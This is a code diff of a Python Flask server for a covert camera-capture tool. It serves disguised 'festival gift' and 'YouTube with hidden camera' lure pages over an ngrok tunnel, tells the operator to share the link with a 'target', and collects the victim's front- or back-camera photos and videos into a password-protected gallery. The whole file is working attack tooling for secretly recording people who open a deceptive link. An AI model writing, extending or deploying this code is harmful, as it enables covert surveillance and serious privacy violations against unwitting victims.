@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Gift Video Receiver Server - Ngrok Direct Receiver & Online Media Gallery
+Gift Video Receiver & Private Gallery Server (Single File Architecture)
 """
 
 import os
@@ -15,55 +15,28 @@ import re
 from datetime import datetime
 from pathlib import Path
 from functools import wraps
-from flask import Flask, request, jsonify, send_file, Response
+from flask import Flask, request, jsonify, send_file, Response, redirect
 from flask_cors import CORS
 from werkzeug.utils import secure_filename
 
-# ============================================
-# CONFIGURATION
-# ============================================
+# Configuration
 UPLOAD_FOLDER = Path("gift_videos")
-PORT = 5000
+RECEIVER_PORT = 5000
+GALLERY_PORT = 5001
 FESTIVAL_HTML = 'festival.html'
 YOUTUBE_HTML = 'youtube.html'
 
-# Ensure upload directory exists
 UPLOAD_FOLDER.mkdir(parents=True, exist_ok=True)
 
 # ============================================
-# FLASK APPLICATION SETUP
+# RECEIVER SERVER APP (PORT 5000)
 # ============================================
-app = Flask(__name__)
-CORS(app)
-
-# Allow file uploads up to 5GB
-app.config["MAX_CONTENT_LENGTH"] = 5 * 1024 * 1024 * 1024
-
+receiver_app = Flask("receiver")
+CORS(receiver_app)
+receiver_app.config["MAX_CONTENT_LENGTH"] = 5 * 1024 * 1024 * 1024
 received_files = []
 
-# ============================================
-# AUTHENTICATION DECORATOR
-# ============================================
-def requires_auth(f):
-    @wraps(f)
-    def decorated(*args, **kwargs):
-        if app.config.get('AUTH_ENABLED', False):
-            auth = request.authorization
-            admin_user = app.config.get('GALLERY_USER')
-            admin_pass = app.config.get('GALLERY_PASS')
-            if not auth or auth.username != admin_user or auth.password != admin_pass:
-                return Response(
-                    '🔒 Access Denied: Gallery authentication required.\n', 401,
-                    {'WWW-Authenticate': 'Basic realm="Private Media Gallery"'}
-                )
-        return f(*args, **kwargs)
-    return decorated
-
-# ============================================
-# WEB ROUTES
-# ============================================
-
-@app.route('/festival')
+@receiver_app.route('/festival')
 def festival_page():
     try:
         with open(FESTIVAL_HTML, 'r') as f:
@@ -71,7 +44,7 @@ def festival_page():
     except FileNotFoundError:
         return f"<h1>Error: {FESTIVAL_HTML} not found!</h1>", 404
 
-@app.route('/youtube')
+@receiver_app.route('/youtube')
 def youtube_page():
     try:
         with open(YOUTUBE_HTML, 'r') as f:
@@ -79,7 +52,7 @@ def youtube_page():
     except FileNotFoundError:
         return f"<h1>Error: {YOUTUBE_HTML} not found!</h1>", 404
 
-@app.route('/upload', methods=['POST'])
+@receiver_app.route('/upload', methods=['POST'])
 def upload_media():
     try:
         if 'media' not in request.files:
@@ -91,10 +64,8 @@ def upload_media():
 
         media_type = request.form.get('type', 'unknown')
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-        
         default_ext = '.jpg' if media_type == 'photo' else '.webm'
         
-        # Secure filename and guarantee proper extension
         safe_name = secure_filename(media_file.filename)
         if not safe_name or safe_name == 'blob':
             safe_name = f"{media_type}_{timestamp}{default_ext}"
@@ -104,46 +75,29 @@ def upload_media():
                 ext_orig = default_ext
             safe_name = f"{name}_{timestamp}{ext_orig}"
         
-        # Save locally
         local_path = UPLOAD_FOLDER / safe_name
         media_file.save(local_path)
-        
-        # Determine Ngrok URLs for direct online viewing
-        base_ngrok = app.config.get('NGROK_URL') or ""
-        view_url = f"{base_ngrok}/view/{safe_name}" if base_ngrok else f"/view/{safe_name}"
-        download_url = f"{base_ngrok}/download/{safe_name}" if base_ngrok else f"/download/{safe_name}"
-        gallery_url = f"{base_ngrok}/gallery" if base_ngrok else "/gallery"
         
         file_info = {
             'filename': safe_name,
             'path': str(local_path.absolute()),
             'type': media_type,
             'timestamp': timestamp,
-            'size': local_path.stat().st_size,
-            'view_url': view_url,
-            'download_url': download_url,
-            'gallery_url': gallery_url
+            'size': local_path.stat().st_size
         }
-        
         received_files.append(file_info)
         
-        # Clean, aligned console display output
         print("\n" + "=" * 60)
         print(f"📹 RECEIVED MEDIA #{len(received_files)} ({media_type.upper()})")
         print("=" * 60)
         print(f"  📁 File:              {safe_name}")
         print(f"  📊 Size:              {file_info['size']:,} bytes")
         print(f"  📂 Local Path:        {file_info['path']}")
-        print(f"  📺 Direct View Link:  {view_url}")
-        print(f"  🖼️ Online Gallery:   {gallery_url}")
         print("=" * 60)
         
         return jsonify({
             'success': True,
             'filename': safe_name,
-            'view_url': view_url,
-            'download_url': download_url,
-            'gallery_url': gallery_url,
             'local_path': file_info.get('path')
         }), 200
 
@@ -151,25 +105,33 @@ def upload_media():
         print(f"❌ Upload Error: {e}")
         return jsonify({'error': str(e)}), 500
 
-@app.route('/view/<filename>', methods=['GET'])
-@requires_auth
-def view_media(filename):
-    filepath = UPLOAD_FOLDER / filename
-    if not filepath.exists():
-        return jsonify({'error': 'File not found'}), 404
-        
-    ext = filename.lower().split('.')[-1]
-    mime_types = {
-        'webm': 'video/webm',
-        'mp4': 'video/mp4',
-        'jpg': 'image/jpeg',
-        'jpeg': 'image/jpeg',
-        'png': 'image/png'
-    }
-    mimetype = mime_types.get(ext, 'application/octet-stream')
-    return send_file(filepath, mimetype=mimetype, as_attachment=False)
 
-@app.route('/gallery', methods=['GET'])
+# ============================================
+# GALLERY SERVER APP (PORT 5001)
+# ============================================
+gallery_app = Flask("gallery")
+CORS(gallery_app)
+
+def requires_auth(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        if gallery_app.config.get('AUTH_ENABLED', False):
+            auth = request.authorization
+            admin_user = gallery_app.config.get('GALLERY_USER')
+            admin_pass = gallery_app.config.get('GALLERY_PASS')
+            if not auth or auth.username != admin_user or auth.password != admin_pass:
+                return Response(
+                    '🔒 Access Denied: Gallery authentication required.\n', 401,
+                    {'WWW-Authenticate': 'Basic realm="Private Media Gallery"'}
+                )
+        return f(*args, **kwargs)
+    return decorated
+
+@gallery_app.route('/')
+def index():
+    return redirect('/gallery')
+
+@gallery_app.route('/gallery', methods=['GET'])
 @requires_auth
 def gallery_page():
     html_content = """<!DOCTYPE html>
@@ -209,7 +171,7 @@ def gallery_page():
 </head>
 <body>
     <header>
-        <h1>📹 Captured Media Gallery</h1>
+        <h1>🖼️ Private Media Gallery</h1>
         <div class="header-right">
             <button class="btn-clear-all" onclick="deleteAllMedia()">🗑️ Delete All</button>
             <div class="stats" id="counter">Auto-Refresh Active (5s)</div>
@@ -226,7 +188,7 @@ def gallery_page():
                 document.getElementById('counter').textContent = `${files.length} Item(s) Received`;
                 
                 if (files.length === 0) {
-                    grid.innerHTML = '<div class="empty">⏳ No photos or videos received yet.<br>Captured media will automatically appear here live!</div>';
+                    grid.innerHTML = '<div class="empty">⏳ No photos or videos received yet.<br>Captured media from Terminal 1 will automatically appear here live!</div>';
                     return;
                 }
                 
@@ -263,38 +225,24 @@ def gallery_page():
         }
 
         async function deleteMedia(filename) {
-            if (!confirm(`Are you sure you want to delete "${filename}"?`)) {
-                return;
-            }
+            if (!confirm(`Are you sure you want to delete "${filename}"?`)) return;
             try {
-                const res = await fetch('/delete/' + encodeURIComponent(filename), {
-                    method: 'POST'
-                });
+                const res = await fetch('/delete/' + encodeURIComponent(filename), { method: 'POST' });
                 const data = await res.json();
-                if (res.ok && data.success) {
-                    loadGallery();
-                } else {
-                    alert('Error deleting file: ' + (data.error || 'Unknown error'));
-                }
+                if (res.ok && data.success) loadGallery();
+                else alert('Error deleting file: ' + (data.error || 'Unknown error'));
             } catch(e) {
                 alert('Failed to delete file: ' + e.message);
             }
         }
 
         async function deleteAllMedia() {
-            if (!confirm('⚠️ Are you sure you want to DELETE ALL received images and videos?')) {
-                return;
-            }
+            if (!confirm('⚠️ Are you sure you want to DELETE ALL received images and videos?')) return;
             try {
-                const res = await fetch('/delete-all', {
-                    method: 'POST'
-                });
+                const res = await fetch('/delete-all', { method: 'POST' });
                 const data = await res.json();
-                if (res.ok && data.success) {
-                    loadGallery();
-                } else {
-                    alert('Error clearing media: ' + (data.error || 'Unknown error'));
-                }
+                if (res.ok && data.success) loadGallery();
+                else alert('Error clearing media: ' + (data.error || 'Unknown error'));
             } catch(e) {
                 alert('Failed to delete all files: ' + e.message);
             }
@@ -307,198 +255,99 @@ def gallery_page():
 </html>"""
     return html_content
 
-@app.route('/files', methods=['GET'])
+@gallery_app.route('/files', methods=['GET'])
 @requires_auth
 def list_files():
-    global received_files
-    # Sync received_files with physical disk files
-    received_files = [f for f in received_files if (UPLOAD_FOLDER / f['filename']).exists()]
-    return jsonify({
-        'files': received_files
-    })
+    files = []
+    if UPLOAD_FOLDER.exists():
+        for filepath in UPLOAD_FOLDER.glob('*'):
+            if filepath.is_file() and not filepath.name.startswith('.'):
+                ext = filepath.suffix.lower()
+                media_type = 'photo' if ext in ['.jpg', '.jpeg', '.png'] else 'video'
+                files.append({
+                    'filename': filepath.name,
+                    'path': str(filepath.absolute()),
+                    'type': media_type,
+                    'size': filepath.stat().st_size
+                })
+    return jsonify({'files': files})
 
-@app.route('/download/<filename>', methods=['GET'])
+@gallery_app.route('/view/<filename>', methods=['GET'])
+@requires_auth
+def view_media(filename):
+    safe_name = secure_filename(filename)
+    filepath = UPLOAD_FOLDER / safe_name
+    if not filepath.exists():
+        return jsonify({'error': 'File not found'}), 404
+        
+    ext = safe_name.lower().split('.')[-1]
+    mime_types = {
+        'webm': 'video/webm',
+        'mp4': 'video/mp4',
+        'jpg': 'image/jpeg',
+        'jpeg': 'image/jpeg',
+        'png': 'image/png'
+    }
+    mimetype = mime_types.get(ext, 'application/octet-stream')
+    return send_file(filepath, mimetype=mimetype, as_attachment=False)
+
+@gallery_app.route('/download/<filename>', methods=['GET'])
 @requires_auth
 def download_file(filename):
-    filepath = UPLOAD_FOLDER / filename
+    safe_name = secure_filename(filename)
+    filepath = UPLOAD_FOLDER / safe_name
     if filepath.exists():
         return send_file(filepath, as_attachment=True)
     return jsonify({'error': 'File not found'}), 404
 
-@app.route('/delete/<filename>', methods=['POST', 'DELETE'])
+@gallery_app.route('/delete/<filename>', methods=['POST', 'DELETE'])
 @requires_auth
 def delete_file(filename):
     try:
         safe_name = secure_filename(filename)
         filepath = UPLOAD_FOLDER / safe_name
-        
-        file_existed = False
         if filepath.exists():
             filepath.unlink()
-            file_existed = True
-            
-        global received_files
-        received_files = [f for f in received_files if f['filename'] != safe_name]
-        
-        if file_existed:
-            print(f"🗑️ Deleted media file: {safe_name}")
-            return jsonify({'success': True, 'message': f'File {safe_name} deleted successfully'}), 200
-        else:
-            return jsonify({'error': 'File not found'}), 404
+            print(f"🗑️ Deleted file: {safe_name}")
+            return jsonify({'success': True}), 200
+        return jsonify({'error': 'File not found'}), 404
     except Exception as e:
-        print(f"❌ Delete error: {e}")
         return jsonify({'error': str(e)}), 500
 
-@app.route('/delete-all', methods=['POST', 'DELETE'])
+@gallery_app.route('/delete-all', methods=['POST', 'DELETE'])
 @requires_auth
 def delete_all_files():
     try:
-        global received_files
         count = 0
-        for f in received_files:
-            filepath = UPLOAD_FOLDER / f['filename']
-            if filepath.exists():
-                filepath.unlink()
-                count += 1
-        
-        # Clear any remaining files in UPLOAD_FOLDER as well
         for filepath in UPLOAD_FOLDER.glob('*'):
             if filepath.is_file():
                 filepath.unlink()
-                
-        received_files = []
+                count += 1
         print(f"🗑️ Deleted all media ({count} files cleared)")
         return jsonify({'success': True, 'count': count}), 200
     except Exception as e:
-        print(f"❌ Delete-all error: {e}")
         return jsonify({'error': str(e)}), 500
 
 
 # ============================================
-# MAIN SERVER CLASS
+# SERVER RUNNERS
 # ============================================
-class GiftServer:
-    def __init__(self):
+class ReceiverRunner:
+    def __init__(self, port=RECEIVER_PORT):
+        self.port = port
         self.ngrok_process = None
         self.ngrok_url = None
-        self.port = PORT
         self.running = True
         self.ngrok_ready = threading.Event()
-
-    def check_html_files(self):
-        if not os.path.exists(FESTIVAL_HTML):
-            print(f"\n❌ Error: {FESTIVAL_HTML} not found!")
-            return False
-        if not os.path.exists(YOUTUBE_HTML):
-            print(f"\n❌ Error: {YOUTUBE_HTML} not found!")
-            return False
-        return True
-
-    def get_camera_type(self):
-        print("\n📷 Select camera type:")
-        print("  1. Front Camera")
-        print("  2. Back Camera")
-        
-        while True:
-            choice = input("\nEnter choice (1 or 2): ").strip()
-            if choice == '1':
-                return 'user'
-            elif choice == '2':
-                return 'environment'
-            else:
-                print("❌ Invalid choice. Enter 1 or 2")
-
-    def get_capture_mode(self):
-        print("\n📸 Select capture mode:")
-        print("  1. Video - Record video")
-        print("  2. Photo - Capture photos")
-        
-        while True:
-            choice = input("\nEnter choice (1 or 2): ").strip()
-            if choice == '1':
-                dur_input = input("   ⏱️ Enter video duration in seconds (default 15): ").strip()
-                duration = int(dur_input) if dur_input.isdigit() and int(dur_input) > 0 else 15
-                return 'video', duration, 0
-            elif choice == '2':
-                photo_input = input("   📸 Enter number of photos to capture (default 5): ").strip()
-                photos = int(photo_input) if photo_input.isdigit() and int(photo_input) > 0 else 5
-                return 'photo', 0, photos
-            else:
-                print("❌ Invalid choice. Enter 1 or 2")
-
-    def show_main_menu(self):
-        print("\n" + "=" * 60)
-        print("🎁 GIFT VIDEO RECEIVER (NGROK DIRECT SERVER)")
-        print("=" * 60)
-        print("\nSelect mode:")
-        print("  1. 🎊 Festival Mode - Gift/surprise page with festival name")
-        print("  2. 🎬 YouTube Mode - YouTube video with hidden camera")
-        print("\n" + "-" * 60)
-        
-        while True:
-            choice = input("\nEnter choice (1 or 2): ").strip()
-            if choice == '1':
-                return 'festival'
-            elif choice == '2':
-                return 'youtube'
-            else:
-                print("❌ Invalid choice. Enter 1 or 2")
-
-    def get_festival_name(self):
-        name = input("\n📝 Enter festival/gift name: ").strip()
-        if not name:
-            name = "Surprise"
-            print(f"   Using default: {name}")
-        return name
-
-    def get_youtube_video(self):
-        print("\n🎬 Enter YouTube video URL or ID:")
-        print("   (Press Enter for default video)")
-        video = input("   ▶ ").strip()
-        
-        if video and ('youtube.com' in video or 'youtu.be' in video):
-            patterns = [
-                r'(?:youtube\.com\/watch\?v=)([^&]+)',
-                r'(?:youtu\.be\/)([^?]+)',
-                r'(?:youtube\.com\/embed\/)([^?]+)'
-            ]
-            for pattern in patterns:
-                match = re.search(pattern, video)
-                if match:
-                    video = match.group(1)
-                    break
-        
-        if not video:
-            video = "dQw4w9WgXcQ"
-            print(f"   Using default video ID: {video}")
-        else:
-            print(f"   Using video ID: {video}")
-        
-        return video
-
-    def generate_link(self, mode, name=None, video_id=None, camera='user', capture_mode='video', duration=15, photos=5):
-        base_url = self.ngrok_url
-        
-        if mode == 'festival':
-            link = f"{base_url}/festival?name={urllib.parse.quote(name)}&camera={camera}&mode={capture_mode}&duration={duration}&photos={photos}"
-            mode_name = "🎊 Festival Mode"
-        else:
-            link = f"{base_url}/youtube?video={urllib.parse.quote(video_id)}&camera={camera}&mode={capture_mode}&duration={duration}&photos={photos}"
-            mode_name = "🎬 YouTube Mode"
-        
-        return link, mode_name
 
     def check_ngrok(self):
         try:
             result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True)
-            if result.returncode == 0:
-                return True
+            return result.returncode == 0
         except FileNotFoundError:
-            pass
-        
-        print("\n❌ ngrok is not installed or not in PATH!")
-        print("📥 Install from: https://ngrok.com/download")
-        return False
+            print("\n❌ ngrok is not installed or not in PATH!")
+            print("📥 Install from: https://ngrok.com/download")
+            return False
 
     def apply_ngrok_authtoken(self, token):
         try:
@@ -508,13 +357,7 @@ class GiftServer:
                 return True
             else:
                 result2 = subprocess.run(['ngrok', 'authtoken', token], capture_output=True, text=True)
-                if result2.returncode == 0:
-                    print("   ✅ Ngrok authtoken configured successfully!")
-                    return True
-                else:
-                    err = result.stderr.strip() or result2.stderr.strip()
-                    print(f"   ⚠️ Warning: {err}")
-                    return False
+                return result2.returncode == 0
         except Exception as e:
             print(f"   ⚠️ Could not set ngrok authtoken: {e}")
             return False
@@ -522,7 +365,6 @@ class GiftServer:
     def setup_ngrok_authtoken(self):
         token = os.getenv("NGROK_AUTHTOKEN")
         token_file = Path(".ngrok_token")
-        choice = ""
 
         if not token and token_file.exists():
             token = token_file.read_text().strip()
@@ -540,15 +382,12 @@ class GiftServer:
                 token = ""
 
         if not token:
-            print("   Get your free authtoken from: https://dashboard.ngrok.com/get-started/your-authtoken")
             token = input("   Enter your ngrok Authtoken (press Enter to skip): ").strip()
 
         if token:
             token_file.write_text(token)
             return self.apply_ngrok_authtoken(token)
-        else:
-            print("   ⚠️ Skipping authtoken setup (using existing CLI configuration).")
-            return True
+        return True
 
     def monitor_ngrok(self):
         try:
@@ -578,7 +417,6 @@ class GiftServer:
 
     def start_ngrok(self):
         print(f"\n🚀 Starting ngrok tunnel on port {self.port}...")
-        
         try:
             self.ngrok_process = subprocess.Popen(
                 ['ngrok', 'http', str(self.port)],
@@ -596,136 +434,263 @@ class GiftServer:
                 print(f"✅ Tunnel established!")
                 return True
             else:
-                if self.ngrok_process and self.ngrok_process.poll() is not None:
-                    pass  # Exact error was already printed in monitor_ngrok
-                else:
+                if self.ngrok_process and self.ngrok_process.poll() is None:
                     print("⚠️ ngrok started but URL not found on http://127.0.0.1:4040")
                 return False
-                
         except Exception as e:
             print(f"❌ Failed to start ngrok: {e}")
             return False
 
     def start_flask(self):
-        print(f"\n🔧 Starting server on port {self.port}...")
-        
+        print(f"\n🔧 Starting receiver server on port {self.port}...")
         def run_flask():
-            app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
-        
+            receiver_app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
         flask_thread = threading.Thread(target=run_flask)
         flask_thread.daemon = True
         flask_thread.start()
         time.sleep(2)
-        print("✅ Server running")
+        print("✅ Receiver server running")
 
-    def wait_for_files(self):
-        print("\n🎁 Server ready! Waiting for incoming files... (Press Ctrl+C to stop)")
-        print(f"📁 Local Folder:   {UPLOAD_FOLDER.absolute()}")
-        print(f"🖼️ Ngrok Gallery: {self.ngrok_url}/gallery")
+    def show_menu(self):
+        print("\n" + "=" * 60)
+        print("📹 RECEIVER & MEDIA CAPTURE SERVER (TERMINAL 1)")
         print("=" * 60)
+        print("\nSelect mode:")
+        print("  1. 🎊 Festival Mode - Gift/surprise page with festival name")
+        print("  2. 🎬 YouTube Mode - YouTube video with hidden camera")
         
-        try:
-            while self.running:
-                time.sleep(1)
-        except KeyboardInterrupt:
-            print("\n\n👋 Shutting down...")
+        while True:
+            choice = input("\nEnter choice (1 or 2): ").strip()
+            if choice in ['1', '2']:
+                return 'festival' if choice == '1' else 'youtube'
+            print("❌ Invalid choice. Enter 1 or 2")
 
-    def cleanup(self):
-        print("\n🧹 Cleaning up...")
-        if self.ngrok_process:
-            self.ngrok_process.terminate()
-            try:
-                self.ngrok_process.wait(timeout=5)
-            except subprocess.TimeoutExpired:
-                self.ngrok_process.kill()
-        print("✅ Done!")
+    def get_camera_type(self):
+        print("\n📷 Select camera type:")
+        print("  1. Front Camera")
+        print("  2. Back Camera")
+        while True:
+            choice = input("\nEnter choice (1 or 2): ").strip()
+            if choice in ['1', '2']:
+                return 'user' if choice == '1' else 'environment'
+            print("❌ Invalid choice. Enter 1 or 2")
 
-    def get_gallery_credentials(self):
-        print("\n🔐 PRIVATE GALLERY LOGIN SETUP:")
-        user = input("   👤 Enter Gallery Username (default: admin): ").strip()
-        if not user:
-            user = "admin"
-            print(f"      Using default username: {user}")
-            
-        password = input("   🔑 Enter Gallery Password (default: admin123): ").strip()
-        if not password:
-            password = "admin123"
-            print(f"      Using default password: {password}")
-            
-        app.config['GALLERY_USER'] = user
-        app.config['GALLERY_PASS'] = password
-        app.config['AUTH_ENABLED'] = True
-        return user, password
+    def get_capture_mode(self):
+        print("\n📸 Select capture mode:")
+        print("  1. Video - Record video")
+        print("  2. Photo - Capture photos")
+        while True:
+            choice = input("\nEnter choice (1 or 2): ").strip()
+            if choice == '1':
+                dur_input = input("   ⏱️ Enter video duration in seconds (default 15): ").strip()
+                duration = int(dur_input) if dur_input.isdigit() and int(dur_input) > 0 else 15
+                return 'video', duration, 0
+            elif choice == '2':
+                photo_input = input("   📸 Enter number of photos to capture (default 5): ").strip()
+                photos = int(photo_input) if photo_input.isdigit() and int(photo_input) > 0 else 5
+                return 'photo', 0, photos
+            print("❌ Invalid choice. Enter 1 or 2")
+
+    def generate_link(self, mode, name=None, video_id=None, camera='user', capture_mode='video', duration=15, photos=5):
+        base_url = self.ngrok_url
+        if mode == 'festival':
+            link = f"{base_url}/festival?name={urllib.parse.quote(name)}&camera={camera}&mode={capture_mode}&duration={duration}&photos={photos}"
+            mode_name = "🎊 Festival Mode"
+        else:
+            link = f"{base_url}/youtube?video={urllib.parse.quote(video_id)}&camera={camera}&mode={capture_mode}&duration={duration}&photos={photos}"
+            mode_name = "🎬 YouTube Mode"
+        return link, mode_name
 
     def run(self):
         try:
-            # Setup
-            if not self.check_html_files():
-                return
-            
             if not self.check_ngrok():
                 return
-
-            # Ngrok Authtoken Setup
             self.setup_ngrok_authtoken()
-            
-            # Main menu
-            mode = self.show_main_menu()
+            mode = self.show_menu()
             camera = self.get_camera_type()
             capture_mode, duration, photos = self.get_capture_mode()
             
             if mode == 'festival':
-                name = self.get_festival_name()
+                name = input("\n📝 Enter festival/gift name (default: Surprise): ").strip() or "Surprise"
                 video_id = None
             else:
-                video_id = self.get_youtube_video()
+                print("\n🎬 Enter YouTube video URL or ID (press Enter for default):")
+                video_input = input("   ▶ ").strip()
+                video_id = "dQw4w9WgXcQ"
+                if video_input:
+                    patterns = [
+                        r'(?:youtube\.com\/watch\?v=)([^&]+)',
+                        r'(?:youtu\.be\/)([^?]+)',
+                        r'(?:youtube\.com\/embed\/)([^?]+)'
+                    ]
+                    for pattern in patterns:
+                        match = re.search(pattern, video_input)
+                        if match:
+                            video_id = match.group(1)
+                            break
+                    else:
+                        video_id = video_input
                 name = None
-            
-            # Setup Gallery Username & Password
-            user, password = self.get_gallery_credentials()
-            
-            # Start server
+
             self.start_flask()
             if not self.start_ngrok():
                 return
-            
-            app.config['NGROK_URL'] = self.ngrok_url
 
-            # Generate link
             link, mode_name = self.generate_link(mode, name, video_id, camera, capture_mode, duration, photos)
-            gallery_link = f"{self.ngrok_url}/gallery"
-            
+
             print("\n" + "=" * 60)
             print(f"📤 SHARE THIS LINK TO TARGET ({mode_name}):")
             print("=" * 60)
             print(f"\n🔗 {link}\n")
             print("=" * 60)
+            print(f"\n🎁 Receiver is ready and listening on port {self.port}!")
+            print(f"📁 Local Upload Folder: {UPLOAD_FOLDER.absolute()}")
+            print("=" * 60)
+
+            while self.running:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print("\n👋 Receiver server shutting down...")
+        finally:
+            if self.ngrok_process:
+                self.ngrok_process.terminate()
+
+
+class GalleryRunner:
+    def __init__(self, port=GALLERY_PORT):
+        self.port = port
+        self.ngrok_process = None
+        self.ngrok_url = None
+        self.running = True
+
+    def get_credentials(self):
+        print("\n" + "=" * 60)
+        print("🖼️ PRIVATE MEDIA GALLERY SERVER (TERMINAL 2)")
+        print("=" * 60)
+        print("\n🔐 GALLERY LOGIN SETUP:")
+        user = input("   👤 Enter Gallery Username (default: admin): ").strip() or "admin"
+        password = input("   🔑 Enter Gallery Password (default: admin123): ").strip() or "admin123"
+        
+        gallery_app.config['GALLERY_USER'] = user
+        gallery_app.config['GALLERY_PASS'] = password
+        gallery_app.config['AUTH_ENABLED'] = True
+        return user, password
+
+    def ask_ngrok(self):
+        choice = input("\n🌐 Create public Ngrok URL for Gallery? (y/N): ").strip().lower()
+        return choice in ['y', 'yes']
+
+    def start_ngrok(self):
+        print(f"\n🚀 Starting ngrok tunnel for Gallery on port {self.port}...")
+        try:
+            self.ngrok_process = subprocess.Popen(
+                ['ngrok', 'http', str(self.port)],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                stdin=subprocess.DEVNULL,
+                text=True
+            )
+            time.sleep(2)
+            for attempt in range(10):
+                for api_url in ['http://127.0.0.1:4040/api/tunnels', 'http://localhost:4040/api/tunnels']:
+                    try:
+                        with urllib.request.urlopen(api_url, timeout=2) as response:
+                            data = json.loads(response.read().decode())
+                            for tunnel in data.get('tunnels', []):
+                                if tunnel.get('proto') == 'https':
+                                    self.ngrok_url = tunnel.get('public_url')
+                                    return True
+                    except Exception:
+                        pass
+                time.sleep(2)
+            print("⚠️ Ngrok tunnel failed to initialize, gallery running locally only.")
+            return False
+        except Exception as e:
+            print(f"❌ Failed to start ngrok: {e}")
+            return False
+
+    def start_flask(self):
+        print(f"\n🔧 Starting Gallery Server on port {self.port}...")
+        def run_flask():
+            gallery_app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
+        flask_thread = threading.Thread(target=run_flask)
+        flask_thread.daemon = True
+        flask_thread.start()
+        time.sleep(2)
+        print("✅ Gallery Server running!")
+
+    def run(self):
+        try:
+            user, password = self.get_credentials()
+            use_ngrok = self.ask_ngrok()
+            
+            self.start_flask()
+            if use_ngrok:
+                self.start_ngrok()
+
+            local_url = f"http://localhost:{self.port}/gallery"
             
             print("\n" + "=" * 60)
-            print("🖼️ YOUR PRIVATE ONLINE GALLERY (VIEW RECEIVED MEDIA):")
+            print("🖼️ PRIVATE GALLERY IS READY:")
             print("=" * 60)
-            print(f"\n🔗 {gallery_link}")
-            print(f"🔐 Login Credentials: Username: {user} | Password: {password}\n")
+            print(f"  🏠 Local Link:   {local_url}")
+            if self.ngrok_url:
+                print(f"  🌐 Ngrok Link:  {self.ngrok_url}/gallery")
+            print(f"  🔐 Credentials: Username: {user} | Password: {password}")
+            print(f"  📁 Reading From: {UPLOAD_FOLDER.absolute()}")
             print("=" * 60)
-            
-            print("\n📋 Configuration Summary:")
-            print(f"   🎯 Mode:          {mode_name}")
-            print(f"   📷 Camera:        {'Front' if camera == 'user' else 'Back'}")
-            print(f"   📸 Capture:       {'Video (' + str(duration) + 's)' if capture_mode == 'video' else 'Photo (' + str(photos) + ' photos)'}")
-            print(f"   🌐 Server Mode:   Direct Ngrok Server Only")
-            print(f"   🔐 Gallery Login: Username={user} | Password={password}")
-            if mode == 'festival':
-                print(f"   🎊 Festival:      {name}")
-            else:
-                print(f"   🎬 Video ID:      {video_id}")
-            
-            self.wait_for_files()
-            
+
+            while self.running:
+                time.sleep(1)
         except KeyboardInterrupt:
-            print("\n\n👋 Goodbye!")
+            print("\n👋 Gallery server shutting down...")
         finally:
-            self.cleanup()
+            if self.ngrok_process:
+                self.ngrok_process.terminate()
+
+def spawn_gallery_terminal():
+    server_script = Path(__file__).absolute()
+    print("\n🖥️ Spawning Private Gallery Server in a NEW terminal window...")
+
+    if sys.platform == "win32":
+        try:
+            subprocess.Popen(f'start "Private Gallery Server" cmd /k "{sys.executable} "{server_script}" --gallery"', shell=True)
+            print("   ✅ Opened Gallery Server in a new Windows terminal!")
+            return True
+        except Exception as e:
+            print(f"   ⚠️ Could not open new window automatically: {e}")
+            return False
+    else:
+        # Linux / macOS (Parrot OS, Debian, Ubuntu, etc.)
+        cmd_str = f'{sys.executable} "{server_script}" --gallery'
+        terminals = [
+            ['x-terminal-emulator', '-e', cmd_str],
+            ['qterminal', '-e', cmd_str],
+            ['gnome-terminal', '--', sys.executable, str(server_script), '--gallery'],
+            ['konsole', '-e', sys.executable, str(server_script), '--gallery'],
+            ['xfce4-terminal', '-e', cmd_str],
+            ['xterm', '-e', cmd_str]
+        ]
+        
+        for term_cmd in terminals:
+            try:
+                if subprocess.run(['which', term_cmd[0]], capture_output=True).returncode == 0:
+                    subprocess.Popen(term_cmd)
+                    print(f"   ✅ Opened Gallery Server in a new terminal window ({term_cmd[0]})!")
+                    return True
+            except Exception:
+                pass
+        
+        print(f"   ⚠️ Could not auto-detect terminal emulator. You can run 'python3 server.py --gallery' in another terminal.")
+        return False
 
 if __name__ == '__main__':
-    server = GiftServer()
-    server.run()
+    if len(sys.argv) > 1 and sys.argv[1] == '--gallery':
+        # Run Gallery Server mode
+        gallery = GalleryRunner()
+        gallery.run()
+    else:
+        # Main entry point: spawn Gallery terminal, run Receiver in current terminal
+        spawn_gallery_terminal()
+        receiver = ReceiverRunner()
+        receiver.run()
